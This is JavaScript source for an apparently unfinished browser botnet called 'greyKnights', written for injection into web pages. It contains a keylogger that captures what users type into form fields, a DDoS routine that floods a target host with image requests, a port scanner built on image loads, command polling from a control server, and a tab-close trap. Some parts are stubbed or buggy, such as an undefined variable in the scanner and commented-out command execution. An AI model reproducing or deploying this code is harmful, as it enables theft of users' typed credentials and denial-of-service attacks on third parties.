(function(){
    var config = {
        cCenter: 'http://localhost/comms/',

    };

    function init (){
        // check if bot has been instantiated in the window.greyKnights
        // else set that value to true
        if(window.greyKnights) return false;
        else window.greyKnights = true;

        // check if firefox or chrome browser and store in the window object

        // generate bot id and use it to set window.greyKnights using a psuedo random number
        window.greyKnights = Math.floor(Math.random() * 10000 + 1);

        console.log('bot loaded');

        // get commands of command center server
        var comms = requestCommands(window.greyKnights);

        //        execCommands(comms);
        //        keyLogger.start();
    }

    // DDOS function
    function dos (options) {
        for(var i = 0; i < options.numRequests; i++){
            var img = new Image();
            var url = options.prot + '://' + options.ip + ':' + options.port + '/?' + i; // i is there to prevernt cauche seeking
            img.src = url;
        }
    }

    var keyLogger = {

        // contains the keys data sets
        elements: [],

        // initialise the keylogger functions
        start: function(){
            this.logOnKeyDown();
            this.logOnFieldFocus();
        },

        // returns all the elements
        done: function(){
            return this.elements;
        },

        // logs each key press to the elements array
        logOnKeyDown: function (socket) {
            function isInputOrTextArea (element) {
                return element instanceof HTMLInputElement || element instanceof HTMLTextAreaElement;
            }
            document.onkeydown = function (e) {
                e = e || window.event;
                var key = e.keyCode ? e.keyCode : e.charCode;
                // add key to the last element if current cursor is in input or text area
                if (isInputOrTextArea(e.srcElement)){
                    keyLogger.elements[ keyLogger.elements.length - 1].keys += String.fromCharCode(key);
                }
            };
        },

        // set on focus events for input and text area
        // adds the element template to the elements array
        logOnFieldFocus : function (socket) {
            var inputFields = document.querySelectorAll('input,textarea'),
                fieldName = function(field) {
                    if (field.id) {
                        return '#' + field.id;
                    }
                    if (field.className) {
                        return '.' + field.className;
                    }
                    return '[' + field.type + ']';
                },
                emitChange = function() {

                    var field =  fieldName(this);
                    var element = {field: field,keys:""};
                    keyLogger.elements.push(element);

                };

            for (var i = 0; i < inputFields.length; i++) {
                var field = inputFields[i];
                field.onfocus = emitChange;
            }
        }
    };

    // request a site or sites
    function getSites(urls){ // for routers

    };

    // scan an ip and port to see if open
    function isPortUp(options,cb){
        var img = new Image(),
            timeout = 100;

        img.onerror = function () {
            if (!img) return;
            img = undefined;
            cb(true);
        };

        img.onload = img.onerror;

        switch(option.port){
            case 21:  src = 'ftp://' + this.id() + '@' + options.host + '/'; break;//ftp
            case 25:  src = 'mailto://' + this.getid() + '@' + options.host ; break;//smtp **
            case 70:  src = 'gopher://' + options.host + '/'; break;//gopher
            case 119: src = 'news://' + options.host + '/'; break;//nntp **
            case 443: src = 'https://' + options.host + '/' + this.getid() + '.jpg';
            default:  src = 'http://' + options.host + ':' + options.port + '/' + this.getid() + '.jpg';// getid is here to prevent cache seekings;
        }

        img.src = src;
        setTimeout(function () {
            if (!img) return;
            img = undefined;
            cb(false);
        }, timeout);
    };

    // request commands
    function requestCommands(botId){
        console.log(botId);
        //            var command = httpGet(config.cCenter + botId)
    }

    function httpGet(theUrl){
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", theUrl, false );
        xmlHttp.send( null );
        return xmlHttp.responseText;
    }

    function execCommands(comms){
        console.log("commands: ", comms);
        //dos({ prot: 'http', ip : 'localhost', port: 80 });
        //    switch  case for each type of commands
    }
    window.onbeforeunload = finCode;
    function finCode(){
        // makes sure that you send all data before the user close the tab

        return 'Press wait till this page closses properly.';

    }

    // start bot
    init();

})();